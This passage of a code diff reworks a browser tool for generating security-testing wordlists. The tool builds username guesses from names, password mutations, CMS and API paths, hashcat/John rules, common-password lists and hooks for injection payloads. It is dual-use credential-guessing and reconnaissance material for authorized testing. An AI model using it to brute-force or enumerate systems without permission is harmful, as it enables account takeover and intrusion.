+        firstlast: document.getElementById('user-firstlast').checked,
+        flast: document.getElementById('user-flast').checked,
+        numbers: document.getElementById('user-numbers').checked,
+        years: document.getElementById('user-years').checked,
+        common: document.getElementById('user-common').checked,
+        suffixes: document.getElementById('user-suffixes').value.split(',').map(s => s.trim()).filter(s => s)
+    };
+    
+    let wordlist = [];
+    
+    if (config.common) {
+        wordlist.push(...getCommonUsernames());
+    }
+    
+    config.names.forEach(name => {
+        const parts = name.trim().split(/\s+/);
+        if (parts.length >= 2) {
+            const first = parts[0].toLowerCase();
+            const last = parts[parts.length - 1].toLowerCase();
+            
+            if (config.firstname) wordlist.push(first);
+            if (config.lastname) wordlist.push(last);
+            if (config.firstlast) wordlist.push(`${first}.${last}`);
+            if (config.flast) wordlist.push(`${first[0]}.${last}`);
+            
+            // Add mutations
+            if (config.numbers) {
+                for (let i = 1; i <= 99; i++) {
+                    wordlist.push(`${first}${i}`);
+                    wordlist.push(`${last}${i}`);
+                }
             }
+            
+            if (config.years) {
+                for (let year = 1980; year <= 2024; year++) {
+                    wordlist.push(`${first}${year}`);
+                    wordlist.push(`${last}${year}`);
+                }
+            }
+            
+            // Add custom suffixes
+            config.suffixes.forEach(suffix => {
+                wordlist.push(`${first}${suffix}`);
+                wordlist.push(`${last}${suffix}`);
+            });
+        }
+    });
+    
+    displayResults(wordlist, 'Username Generation');
+}
+
+function generatePatterns() {
+    const config = {
+        rules: document.getElementById('pattern-rules').value.split('\n').filter(rule => rule.trim()),
+        words: document.getElementById('pattern-words').value.split('\n').filter(word => word.trim()),
+        iterations: parseInt(document.getElementById('pattern-iterations').value)
+    };
+    
+    let wordlist = [];
+    
+    config.rules.forEach(rule => {
+        for (let i = 0; i < config.iterations; i++) {
+            const generated = generateFromPattern(rule, config.words);
+            if (generated) wordlist.push(generated);
+        }
+    });
+    
+    displayResults(wordlist, 'Custom Patterns');
+}
+
+function generateHybrid() {
+    const config = {
+        base: document.getElementById('hybrid-base').value.split('\n').filter(word => word.trim()),
+        prepend: document.getElementById('hybrid-prepend').checked,
+        append: document.getElementById('hybrid-append').checked,
+        years: document.getElementById('hybrid-years').checked,
+        special: document.getElementById('hybrid-special').checked,
+        leet: document.getElementById('hybrid-leet').checked,
+        case: document.getElementById('hybrid-case').checked,
+        reverse: document.getElementById('hybrid-reverse').checked,
+        custom: document.getElementById('hybrid-custom').value.split(',').map(s => s.trim()).filter(s => s)
+    };
+    
+    let wordlist = [...config.base];
+    
+    config.base.forEach(word => {
+        const baseWord = word.trim();
+        
+        if (config.prepend) {
+            for (let i = 0; i <= 999; i++) {
+                wordlist.push(`${i}${baseWord}`);
+            }
+        }
+        
+        if (config.append) {
+            for (let i = 0; i <= 999; i++) {
+                wordlist.push(`${baseWord}${i}`);
+            }
+        }
+        
+        if (config.years) {
+            for (let year = 1980; year <= 2024; year++) {
+                wordlist.push(`${baseWord}${year}`);
+            }
+        }
+        
+        if (config.special) {
+            const specialChars = ['!', '@', '#', '$', '%', '^', '&', '*'];
+            specialChars.forEach(char => {
+                wordlist.push(`${baseWord}${char}`);
+                wordlist.push(`${char}${baseWord}`);
+            });
+        }
+        
+        if (config.leet) {
+            wordlist.push(toLeetSpeak(baseWord));
+        }
+        
+        if (config.case) {
+            wordlist.push(baseWord.toUpperCase());
+            wordlist.push(capitalizeFirst(baseWord));
+        }
+        
+        if (config.reverse) {
+            wordlist.push(baseWord.split('').reverse().join(''));
+        }
+        
+        config.custom.forEach(addition => {
+            wordlist.push(`${baseWord}${addition}`);
+            wordlist.push(`${addition}${baseWord}`);
         });
-    }
+    });
+    
+    displayResults(wordlist, 'Hybrid Combinations');
+}
 
-    analyzeWordlist(content, filename) {
-        const lines = content.split('\n').filter(line => line.trim());
-        const unique = [...new Set(lines)];
-        const avgLength = lines.length > 0 ? lines.reduce((sum, line) => sum + line.length, 0) / lines.length : 0;
-        
-        const analysis = {
-            filename,
-            totalLines: lines.length,
-            uniqueLines: unique.length,
-            duplicates: lines.length - unique.length,
-            avgLength: avgLength.toFixed(2),
-            minLength: lines.length > 0 ? Math.min(...lines.map(l => l.length)) : 0,
-            maxLength: lines.length > 0 ? Math.max(...lines.map(l => l.length)) : 0,
-            size: new Blob([content]).size
-        };
-        
-        this.displayAnalysis(analysis);
+function generateAPI() {
+    const config = {
+        rest: document.getElementById('api-rest').checked,
+        graphql: document.getElementById('api-graphql').checked,
+        soap: document.getElementById('api-soap').checked,
+        webhooks: document.getElementById('api-webhooks').checked,
+        get: document.getElementById('api-get').checked,
+        post: document.getElementById('api-post').checked,
+        put: document.getElementById('api-put').checked,
+        delete: document.getElementById('api-delete').checked
+    };
+    
+    let wordlist = [];
+    
+    if (config.rest) {
+        wordlist.push(...getRESTEndpoints());
     }
+    
+    if (config.graphql) {
+        wordlist.push(...getGraphQLEndpoints());
+    }
+    
+    if (config.soap) {
+        wordlist.push(...getSOAPEndpoints());
+    }
+    
+    if (config.webhooks) {
+        wordlist.push(...getWebhookEndpoints());
+    }
+    
+    displayResults(wordlist, 'API Endpoints');
+}
 
-    displayAnalysis(analysis) {
-        const resultsDiv = document.getElementById('analysisResults');
-        if (!resultsDiv) return;
-        
-        resultsDiv.style.display = 'block';
-        resultsDiv.innerHTML = `
-            <div class="analysis-card">
-                <h3><i class="fas fa-file-alt"></i> ${analysis.filename}</h3>
-                <div class="analysis-stats">
-                    <div class="stat">
-                        <span class="stat-label">Total Lines:</span>
-                        <span class="stat-value">${analysis.totalLines.toLocaleString()}</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-label">Unique Lines:</span>
-                        <span class="stat-value">${analysis.uniqueLines.toLocaleString()}</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-label">Duplicates:</span>
-                        <span class="stat-value">${analysis.duplicates.toLocaleString()}</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-label">Avg Length:</span>
-                        <span class="stat-value">${analysis.avgLength}</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-label">Size:</span>
-                        <span class="stat-value">${this.formatBytes(analysis.size)}</span>
-                    </div>
-                </div>
+function generateWebTech() {
+    const config = {
+        wordpress: document.getElementById('tech-wordpress').checked,
+        drupal: document.getElementById('tech-drupal').checked,
+        joomla: document.getElementById('tech-joomla').checked,
+        magento: document.getElementById('tech-magento').checked,
+        apache: document.getElementById('tech-apache').checked,
+        nginx: document.getElementById('tech-nginx').checked,
+        tomcat: document.getElementById('tech-tomcat').checked,
+        iis: document.getElementById('tech-iis').checked
+    };
+    
+    let wordlist = [];
+    
+    if (config.wordpress) {
+        wordlist.push(...getWordPressPaths());
+    }
+    
+    if (config.drupal) {
+        wordlist.push(...getDrupalPaths());
+    }
+    
+    if (config.joomla) {
+        wordlist.push(...getJoomlaPaths());
+    }
+    
+    if (config.magento) {
+        wordlist.push(...getMagentoPaths());
+    }
+    
+    if (config.apache) {
+        wordlist.push(...getApachePaths());
+    }
+    
+    if (config.nginx) {
+        wordlist.push(...getNginxPaths());
+    }
+    
+    if (config.tomcat) {
+        wordlist.push(...getTomcatPaths());
+    }
+    
+    if (config.iis) {
+        wordlist.push(...getIISPaths());
+    }
+    
+    displayResults(wordlist, 'Web Technology Paths');
+}
+
+function generateSecurity() {
+    const config = {
+        sqli: document.getElementById('sec-sqli').checked,
+        xss: document.getElementById('sec-xss').checked,
+        lfi: document.getElementById('sec-lfi').checked,
+        rfi: document.getElementById('sec-rfi').checked,
+        basic: document.getElementById('sec-basic').checked,
+        advanced: document.getElementById('sec-advanced').checked,
+        bypass: document.getElementById('sec-bypass').checked,
+        encoded: document.getElementById('sec-encoded').checked
+    };
+    
+    let wordlist = [];
+    
+    if (config.sqli) {
+        wordlist.push(...getSQLInjectionPayloads(config));
+    }
+    
+    if (config.xss) {
+        wordlist.push(...getXSSPayloads(config));
+    }
+    
+    if (config.lfi) {
+        wordlist.push(...getLFIPayloads(config));
+    }
+    
+    if (config.rfi) {
+        wordlist.push(...getRFIPayloads(config));
+    }
+    
+    displayResults(wordlist, 'Security Testing Payloads');
+}
+
+// Utility Functions
+function generateFromPattern(pattern, words) {
+    let result = pattern;
+    
+    // Replace placeholders
+    result = result.replace(/@l/g, () => getRandomChar('abcdefghijklmnopqrstuvwxyz'));
+    result = result.replace(/@u/g, () => getRandomChar('ABCDEFGHIJKLMNOPQRSTUVWXYZ'));
+    result = result.replace(/@d/g, () => getRandomChar('0123456789'));
+    result = result.replace(/@s/g, () => getRandomChar('!@#$%^&*()_+-=[]{}|;:,.<>?'));
+    result = result.replace(/@w/g, () => words[Math.floor(Math.random() * words.length)] || '');
+    
+    return result;
+}
+
+function getRandomChar(charset) {
+    return charset[Math.floor(Math.random() * charset.length)];
+}
+
+function toLeetSpeak(word) {
+    const leetMap = {
+        'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7', 'l': '1'
+    };
+    return word.toLowerCase().split('').map(char => leetMap[char] || char).join('');
+}
+
+function capitalizeFirst(word) {
+    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
+}
+
+function calculateWordlistStats(words) {
+    const unique = [...new Set(words)];
+    const totalLength = words.join('').length;
+    const avgLength = words.length > 0 ? (totalLength / words.length).toFixed(1) : 0;
+    
+    return {
+        count: words.length,
+        unique: unique.length,
+        size: new Blob([words.join('\n')]).size,
+        avgLength: avgLength
+    };
+}
+
+function displayResults(wordlist, generatorName) {
+    currentWordlist = [...new Set(wordlist)]; // Remove duplicates
+    const stats = calculateWordlistStats(currentWordlist);
+    
+    // Update results
+    document.getElementById('resultsTextarea').value = currentWordlist.join('\n');
+    document.getElementById('wordCount').textContent = stats.count.toLocaleString();
+    document.getElementById('fileSize').textContent = formatBytes(stats.size);
+    document.getElementById('uniqueCount').textContent = stats.unique.toLocaleString();
+    document.getElementById('avgLength').textContent = stats.avgLength;
+    
+    // Update global stats
+    appStats.totalGenerated += stats.count;
+    updateStats();
+    
+    // Add to history
+    addToHistory({
+        type: generatorName,
+        count: stats.count,
+        timestamp: new Date().toISOString(),
+        wordlist: currentWordlist.slice(0, 100) // Store first 100 for preview
+    });
+    
+    showToast(`Generated ${stats.count} words for ${generatorName}`, 'success');
+}
+
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+function showProgress() {
+    const progressBar = document.getElementById('progressBar');
+    const progressFill = progressBar.querySelector('.progress-fill');
+    
+    progressBar.style.display = 'block';
+    progressFill.style.width = '0%';
+    
+    let width = 0;
+    const interval = setInterval(() => {
+        width += 2;
+        progressFill.style.width = width + '%';
+        if (width >= 100) {
+            clearInterval(interval);
+        }
+    }, 10);
+}
+
+function hideProgress() {
+    setTimeout(() => {
+        document.getElementById('progressBar').style.display = 'none';
+    }, 500);
+}
+
+// Action Functions
+function copyToClipboard() {
+    const textarea = document.getElementById('resultsTextarea');
+    textarea.select();
+    document.execCommand('copy');
+    showToast('Wordlist copied to clipboard!', 'success');
+}
+
+function downloadWordlist() {
+    if (currentWordlist.length === 0) {
+        showToast('No wordlist to download', 'error');
+        return;
+    }
+    
+    const blob = new Blob([currentWordlist.join('\n')], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    
+    a.href = url;
+    a.download = `wordlist_${new Date().getTime()}.txt`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    appStats.totalDownloads++;
+    updateStats();
+    showToast('Wordlist downloaded successfully!', 'success');
+}
+
+function saveToHistory() {
+    if (currentWordlist.length === 0) {
+        showToast('No wordlist to save', 'error');
+        return;
+    }
+    
+    const historyItem = {
+        type: 'Manual Save',
+        count: currentWordlist.length,
+        timestamp: new Date().toISOString(),
+        wordlist: currentWordlist
+    };
+    
+    addToHistory(historyItem);
+    showToast('Wordlist saved to history!', 'success');
+}
+
+function addToHistory(item) {
+    generationHistory.unshift(item);
+    if (generationHistory.length > 50) {
+        generationHistory.pop();
+    }
+    
+    updateHistoryDisplay();
+    saveToLocalStorage();
+}
+
+function updateHistoryDisplay() {
+    const historyList = document.getElementById('historyList');
+    
+    if (generationHistory.length === 0) {
+        historyList.innerHTML = '<div class="history-empty">No history yet</div>';
+        return;
+    }
+    
+    historyList.innerHTML = generationHistory.slice(0, 10).map(item => `
+        <div class="history-item" onclick="loadFromHistory(${generationHistory.indexOf(item)})">
+            <div class="history-item-title">${item.type}</div>
+            <div class="history-item-meta">
+                ${item.count ? `${item.count} words • ` : ''}
+                ${new Date(item.timestamp).toLocaleString()}
             </div>
-        `;
-    }
+        </div>
+    `).join('');
+}
 
-    addToHistory(title, count, size) {
-        const historyItem = {
-            id: Date.now(),
-            title,
-            count,
-            size,
-            generator: this.currentGenerator,
-            timestamp: new Date().toISOString()
-        };
-        
-        this.generationHistory.unshift(historyItem);
-        this.updateHistoryDisplay();
-        this.saveHistory();
-    }
-
-    updateHistoryDisplay() {
-        const historyList = document.getElementById('historyList');
-        if (!historyList) return;
-        
-        if (this.generationHistory.length === 0) {
-            historyList.innerHTML = `
-                <div class="empty-state">
-                    <i class="fas fa-history"></i>
-                    <h3>No Generation History</h3>
-                    <p>Your wordlist generation history will appear here.</p>
-                </div>
-            `;
-            return;
-        }
-        
-        historyList.innerHTML = this.generationHistory.map(item => `
-            <div class="history-item">
-                <div class="history-info">
-                    <h4>${item.title}</h4>
-                    <div class="history-meta">
-                        <span><i class="fas fa-list"></i> ${item.count.toLocaleString()} words</span>
-                        <span><i class="fas fa-weight"></i> ${this.formatBytes(item.size)}</span>
-                        <span><i class="fas fa-cog"></i> ${item.generator}</span>
-                        <span><i class="fas fa-clock"></i> ${new Date(item.timestamp).toLocaleString()}</span>
-                    </div>
-                </div>
-                <div class="history-actions-item">
-                    <button class="btn-icon" onclick="wordlistArsenal.regenerateFromHistory(${item.id})" title="Regenerate">
-                        <i class="fas fa-redo"></i>
-                    </button>
-                    <button class="btn-icon" onclick="wordlistArsenal.deleteHistoryItem(${item.id})" title="Delete">
-                        <i class="fas fa-trash"></i>
-                    </button>
-                </div>
-            </div>
-        `).join('');
-    }
-
-    setupHistoryActions() {
-        const clearBtn = document.getElementById('clearHistory');
-        const exportBtn = document.getElementById('exportHistory');
-        
-        if (clearBtn) {
-            clearBtn.addEventListener('click', () => {
-                this.generationHistory = [];
-                this.updateHistoryDisplay();
-                this.saveHistory();
-                this.showToast('Success', 'History cleared successfully!', 'success');
-            });
-        }
-
-        if (exportBtn) {
-            exportBtn.addEventListener('click', () => {
-                const csv = this.generateHistoryCSV();
-                this.downloadWordlist(csv, 'generation_history.csv');
-            });
-        }
-    }
-
-    generateHistoryCSV() {
-        const headers = 'Title,Count,Size,Generator,Timestamp\n';
-        const rows = this.generationHistory.map(item => 
-            `"${item.title}",${item.count},${item.size},"${item.generator}","${item.timestamp}"`
-        ).join('\n');
-        return headers + rows;
-    }
-
-    setupTools() {
-        const filterBtn = document.getElementById('filterTool');
-        const mergeBtn = document.getElementById('mergeTool');
-        const ruleBtn = document.getElementById('ruleTool');
-        const statsBtn = document.getElementById('statsTool');
-        
-        if (filterBtn) {
-            filterBtn.addEventListener('click', () => {
-                this.openFilterTool();
-            });
-        }
-
-        if (mergeBtn) {
-            mergeBtn.addEventListener('click', () => {
-                this.openMergeTool();
-            });
-        }
-
-        if (ruleBtn) {
-            ruleBtn.addEventListener('click', () => {
-                this.openRuleTool();
-            });
-        }
-
-        if (statsBtn) {
-            statsBtn.addEventListener('click', () => {
-                this.openStatsTool();
-            });
-        }
-    }
-
-    openFilterTool() {
-        this.showModal('Filter & Clean Tool', `
-            <div class="tool-content">
-                <div class="form-group">
-                    <label>Input Wordlist (one word per line)</label>
-                    <textarea class="form-control" id="filterInput" rows="6" placeholder="Enter your wordlist here..."></textarea>
-                </div>
-                <div class="form-group">
-                    <label>Filter Options</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="removeDuplicates" checked>
-                            <label for="removeDuplicates">Remove Duplicates</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="removeEmpty" checked>
-                            <label for="removeEmpty">Remove Empty Lines</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="sortAlpha">
-                            <label for="sortAlpha">Sort Alphabetically</label>
-                        </div>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>Length Filter</label>
-                    <div style="display: flex; gap: 1rem;">
-                        <input type="number" class="form-control" id="minLength" placeholder="Min Length">
-                        <input type="number" class="form-control" id="maxLength" placeholder="Max Length">
-                    </div>
-                </div>
-                <div class="modal-actions">
-                    <button class="btn-secondary" onclick="wordlistArsenal.closeModal()">Cancel</button>
-                    <button class="btn-primary" onclick="wordlistArsenal.applyFilter()">Apply Filter</button>
-                </div>
-            </div>
-        `);
-    }
-
-    openMergeTool() {
-        this.showModal('Merge Lists Tool', `
-            <div class="tool-content">
-                <div class="form-group">
-                    <label>First Wordlist</label>
-                    <textarea class="form-control" id="mergeList1" rows="4" placeholder="Enter first wordlist..."></textarea>
-                </div>
-                <div class="form-group">
-                    <label>Second Wordlist</label>
-                    <textarea class="form-control" id="mergeList2" rows="4" placeholder="Enter second wordlist..."></textarea>
-                </div>
-                <div class="form-group">
-                    <label>Merge Options</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="mergeRemoveDuplicates" checked>
-                            <label for="mergeRemoveDuplicates">Remove Duplicates</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="mergeSortOutput">
-                            <label for="mergeSortOutput">Sort Output</label>
-                        </div>
-                    </div>
-                </div>
-                <div class="modal-actions">
-                    <button class="btn-secondary" onclick="wordlistArsenal.closeModal()">Cancel</button>
-                    <button class="btn-primary" onclick="wordlistArsenal.applyMerge()">Merge Lists</button>
-                </div>
-            </div>
-        `);
-    }
-
-    openRuleTool() {
-        this.showModal('Rule Generator Tool', `
-            <div class="tool-content">
-                <div class="form-group">
-                    <label>Rule Type</label>
-                    <select class="form-control" id="ruleType">
-                        <option value="hashcat">HashCat Rules</option>
-                        <option value="john">John the Ripper Rules</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Rule Templates</label>
-                    <div class="checkbox-group">
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="ruleCapitalize" checked>
-                            <label for="ruleCapitalize">Capitalize First Letter</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="ruleAppendNumbers" checked>
-                            <label for="ruleAppendNumbers">Append Numbers (0-99)</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="ruleAppendSpecial">
-                            <label for="ruleAppendSpecial">Append Special Characters</label>
-                        </div>
-                        <div class="checkbox-item">
-                            <input type="checkbox" id="ruleReverse">
-                            <label for="ruleReverse">Reverse String</label>
-                        </div>
-                    </div>
-                </div>
-                <div class="modal-actions">
-                    <button class="btn-secondary" onclick="wordlistArsenal.closeModal()">Cancel</button>
-                    <button class="btn-primary" onclick="wordlistArsenal.generateRules()">Generate Rules</button>
-                </div>
-            </div>
-        `);
-    }
-
-    openStatsTool() {
-        this.showModal('Statistics Tool', `
-            <div class="tool-content">
-                <div class="form-group">
-                    <label>Input Wordlist</label>
-                    <textarea class="form-control" id="statsInput" rows="6" placeholder="Enter wordlist for analysis..."></textarea>
-                </div>
-                <div class="modal-actions">
-                    <button class="btn-secondary" onclick="wordlistArsenal.closeModal()">Cancel</button>
-                    <button class="btn-primary" onclick="wordlistArsenal.analyzeStats()">Analyze</button>
-                </div>
-                <div id="statsResults" style="margin-top: 1rem;"></div>
-            </div>
-        `);
-    }
-
-    applyFilter() {
-        const input = document.getElementById('filterInput')?.value || '';
-        const lines = input.split('\n');
-        let filtered = lines;
-        
-        if (document.getElementById('removeEmpty')?.checked) {
-            filtered = filtered.filter(line => line.trim());
-        }
-        
-        if (document.getElementById('removeDuplicates')?.checked) {
-            filtered = [...new Set(filtered)];
-        }
-        
-        const minLen = parseInt(document.getElementById('minLength')?.value) || 0;
-        const maxLen = parseInt(document.getElementById('maxLength')?.value) || Infinity;
-        filtered = filtered.filter(line => line.length >= minLen && line.length <= maxLen);
-        
-        if (document.getElementById('sortAlpha')?.checked) {
-            filtered.sort();
-        }
-        
-        this.displayWordlist(filtered, 'Filtered Wordlist');
-        this.closeModal();
-    }
-
-    applyMerge() {
-        const list1 = document.getElementById('mergeList1')?.value.split('\n').filter(l => l.trim()) || [];
-        const list2 = document.getElementById('mergeList2')?.value.split('\n').filter(l => l.trim()) || [];
-        
-        let merged = [...list1, ...list2];
-        
-        if (document.getElementById('mergeRemoveDuplicates')?.checked) {
-            merged = [...new Set(merged)];
-        }
-        
-        if (document.getElementById('mergeSortOutput')?.checked) {
-            merged.sort();
-        }
-        
-        this.displayWordlist(merged, 'Merged Wordlist');
-        this.closeModal();
-    }
-
-    generateRules() {
-        const ruleType = document.getElementById('ruleType')?.value || 'hashcat';
-        let rules = [];
-        
-        if (document.getElementById('ruleCapitalize')?.checked) {
-            rules.push(ruleType === 'hashcat' ? 'c' : ':');
-        }
-        
-        if (document.getElementById('ruleAppendNumbers')?.checked) {
-            for (let i = 0; i < 100; i++) {
-                rules.push(ruleType === 'hashcat' ? `$${i}` : `$${i}`);
-            }
-        }
-        
-        if (document.getElementById('ruleAppendSpecial')?.checked) {
-            const special = ['!', '@', '#', '$', '%', '^', '&', '*'];
-            special.forEach(char => {
-                rules.push(ruleType === 'hashcat' ? `$${char}` : `$${char}`);
-            });
-        }
-        
-        if (document.getElementById('ruleReverse')?.checked) {
-            rules.push(ruleType === 'hashcat' ? 'r' : 'r');
-        }
-        
-        this.displayWordlist(rules, `${ruleType.toUpperCase()} Rules`);
-        this.closeModal();
-    }
-
-    analyzeStats() {
-        const input = document.getElementById('statsInput')?.value || '';
-        const lines = input.split('\n').filter(l => l.trim());
-        const unique = [...new Set(lines)];
-        
-        const stats = {
-            total: lines.length,
-            unique: unique.length,
-            duplicates: lines.length - unique.length,
-            avgLength: lines.length > 0 ? lines.reduce((sum, line) => sum + line.length, 0) / lines.length : 0,
-            minLength: lines.length > 0 ? Math.min(...lines.map(l => l.length)) : 0,
-            maxLength: lines.length > 0 ? Math.max(...lines.map(l => l.length)) : 0,
-            charset: this.analyzeCharset(lines)
-        };
-        
-        const resultsDiv = document.getElementById('statsResults');
-        if (resultsDiv) {
-            resultsDiv.innerHTML = `
-                <div class="stats-display">
-                    <h4>Analysis Results</h4>
-                    <div class="stat-grid">
-                        <div>Total Words: ${stats.total.toLocaleString()}</div>
-                        <div>Unique Words: ${stats.unique.toLocaleString()}</div>
-                        <div>Duplicates: ${stats.duplicates.toLocaleString()}</div>
-                        <div>Average Length: ${stats.avgLength.toFixed(2)}</div>
-                        <div>Min Length: ${stats.minLength}</div>
-                        <div>Max Length: ${stats.maxLength}</div>
-                        <div>Character Set: ${stats.charset}</div>
-                    </div>
-                </div>
-            `;
-        }
-    }
-
-    analyzeCharset(lines) {
-        const hasUpper = lines.some(line => /[A-Z]/.test(line));
-        const hasLower = lines.some(line => /[a-z]/.test(line));
-        const hasDigits = lines.some(line => /[0-9]/.test(line));
-        const hasSpecial = lines.some(line => /[^A-Za-z0-9]/.test(line));
-        
-        const charset = [];
-        if (hasLower) charset.push('lowercase');
-        if (hasUpper) charset.push('uppercase');
-        if (hasDigits) charset.push('digits');
-        if (hasSpecial) charset.push('special');
-        
-        return charset.join(', ');
-    }
-
-    handleFabAction(action) {
-        document.getElementById('fab')?.classList.remove('active');
-        document.getElementById('fabMenu')?.classList.remove('active');
-        
-        switch (action) {
-            case 'quick-generate':
-                this.openQuickGenerate();
-                break;
-            case 'import':
-                document.getElementById('fileInput')?.click();
-                break;
-            case 'help':
-                this.openHelp();
-                break;
-        }
-    }
-
-    openQuickGenerate() {
-        this.showModal('Quick Generate', `
-            <div class="quick-generate-content">
-                <h4>Common Wordlists</h4>
-                <div class="quick-options">
-                    <button class="btn-primary" onclick="wordlistArsenal.quickGenerate('common-passwords')">
-                        <i class="fas fa-key"></i>
-                        Common Passwords
-                    </button>
-                    <button class="btn-primary" onclick="wordlistArsenal.quickGenerate('common-usernames')">
-                        <i class="fas fa-user"></i>
-                        Common Usernames
-                    </button>
-                    <button class="btn-primary" onclick="wordlistArsenal.quickGenerate('web-dirs')">
-                        <i class="fas fa-folder"></i>
-                        Web Directories
-                    </button>
-                    <button class="btn-primary" onclick="wordlistArsenal.quickGenerate('file-extensions')">
-                        <i class="fas fa-file"></i>
-                        File Extensions
-                    </button>
-                </div>
-            </div>
-        `);
-    }
-
-    quickGenerate(type) {
-        const wordlists = {
-            'common-passwords': ['123456', 'password', 'admin', 'letmein', 'welcome', 'monkey', 'dragon', 'abc123', 'mustang', 'password1', 'qwerty', 'football', 'iloveyou', 'admin123', 'welcome123', 'login', 'master', 'hello', 'freedom', 'whatever'],
-            'common-usernames': ['admin', 'administrator', 'user', 'guest', 'test', 'demo', 'root', 'sa', 'oracle', 'postgres', 'mysql', 'ftp', 'mail', 'email', 'web', 'www', 'http', 'ssh', 'support', 'service'],
-            'web-dirs': ['admin', 'backup', 'config', 'data', 'files', 'images', 'includes', 'scripts', 'styles', 'uploads', 'downloads', 'documents', 'media', 'assets', 'content', 'public', 'private', 'secure', 'hidden', 'temp'],
-            'file-extensions': ['php', 'html', 'htm', 'asp', 'aspx', 'jsp', 'js', 'css', 'txt', 'xml', 'json', 'sql', 'bak', 'old', 'log', 'conf', 'config', 'inc', 'class', 'java']
-        };
-        
-        this.displayWordlist(wordlists[type], `Quick Generate: ${type}`);
-        this.closeModal();
-    }
-
-    openHelp() {
-        this.showModal('Help & Documentation', `
-            <div class="help-content">
-                <h4>Wordlist Arsenal Guide</h4>
-                
-                <div class="help-section">
-                    <h5><i class="fas fa-cogs"></i> Generators</h5>
-                    <p>Use the Generators tab to create custom wordlists. Each generator has specific options and real-time preview.</p>
-                </div>
-                
-                <div class="help-section">
-                    <h5><i class="fas fa-search"></i> Analyzer</h5>
-                    <p>Upload existing wordlists to analyze their composition, find duplicates, and get detailed statistics.</p>
-                </div>
-                
-                <div class="help-section">
-                    <h5><i class="fas fa-wrench"></i> Tools</h5>
-                    <p>Use advanced tools to filter, merge, and manipulate wordlists. Generate rules for password crackers.</p>
-                </div>
-                
-                <div class="help-section">
-                    <h5><i class="fas fa-download"></i> Export</h5>
-                    <p>All generated wordlists can be downloaded as text files or copied to clipboard for immediate use.</p>
-                </div>
-                
-                <div class="help-section">
-                    <h5><i class="fas fa-exclamation-triangle"></i> Ethical Use</h5>
-                    <p><strong>Important:</strong> This tool is for authorized security testing only. Always ensure you have permission before testing.</p>
-                </div>
-            </div>
-        `);
-    }
-
-    showModal(title, content) {
-        const modal = document.getElementById('modal');
-        const overlay = document.getElementById('modalOverlay');
-        
-        if (!modal || !overlay) return;
-        
-        modal.innerHTML = `
-            <div class="modal-header">
-                <h3>${title}</h3>
-                <button class="btn-icon" onclick="wordlistArsenal.closeModal()">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-            <div class="modal-body">
-                ${content}
-            </div>
-        `;
-        
-        overlay.classList.add('active');
-    }
-
-    closeModal() {
-        const overlay = document.getElementById('modalOverlay');
-        if (overlay) {
-            overlay.classList.remove('active');
-        }
-    }
-
-    showToast(title, message, type = 'info') {
-        const container = document.getElementById('toastContainer');
-        if (!container) return;
-        
-        const toast = document.createElement('div');
-        toast.className = `toast ${type}`;
-        
-        toast.innerHTML = `
-            <div class="toast-content">
-                <div class="toast-title">${title}</div>
-                <div class="toast-message">${message}</div>
-            </div>
-            <button class="btn-icon" onclick="this.parentElement.remove()">
-                <i class="fas fa-times"></i>
-            </button>
-        `;
-        
-        container.appendChild(toast);
-        
-        setTimeout(() => toast.classList.add('show'), 100);
-        setTimeout(() => toast.remove(), 5000);
-    }
-
-    updateStats(generator, count) {
-        this.stats.totalGenerated += count;
-        this.stats.generatorUsage[generator] = (this.stats.generatorUsage[generator] || 0) + 1;
-        
-        // Find most used generator
-        let mostUsed = 'None';
-        let maxUsage = 0;
-        for (const [gen, usage] of Object.entries(this.stats.generatorUsage)) {
-            if (usage > maxUsage) {
-                maxUsage = usage;
-                mostUsed = gen;
-            }
-        }
-        this.stats.mostUsed = mostUsed;
-        
-        this.saveStats();
-        this.updateStatsDisplay();
-        this.addActivity(`Generated ${count.toLocaleString()} words using ${generator} generator`);
-    }
-
-    updateStatsDisplay() {
-        const totalGenerated = document.getElementById('totalGenerated');
-        const activeSessions = document.getElementById('activeSessions');
-        const totalDownloads = document.getElementById('totalDownloads');
-        const mostUsed = document.getElementById('mostUsed');
-        
-        if (totalGenerated) totalGenerated.textContent = this.stats.totalGenerated.toLocaleString();
-        if (activeSessions) activeSessions.textContent = this.stats.activeSessions;
-        if (totalDownloads) totalDownloads.textContent = this.stats.totalDownloads.toLocaleString();
-        if (mostUsed) mostUsed.textContent = this.stats.mostUsed;
-    }
-
-    addActivity(message) {
-        const activityList = document.getElementById('activityList');
-        if (!activityList) return;
-        
-        const activity = document.createElement('div');
-        activity.className = 'activity-item';
-        activity.innerHTML = `
-            <i class="fas fa-info-circle"></i>
-            <span>${message}</span>
-            <time>Just now</time>
-        `;
-        
-        activityList.insertBefore(activity, activityList.firstChild);
-        
-        // Keep only last 10 activities
-        while (activityList.children.length > 10) {
-            activityList.removeChild(activityList.lastChild);
-        }
-    }
-
-    saveStats() {
-        localStorage.setItem('wordlist_arsenal_stats', JSON.stringify(this.stats));
-    }
-
-    saveHistory() {
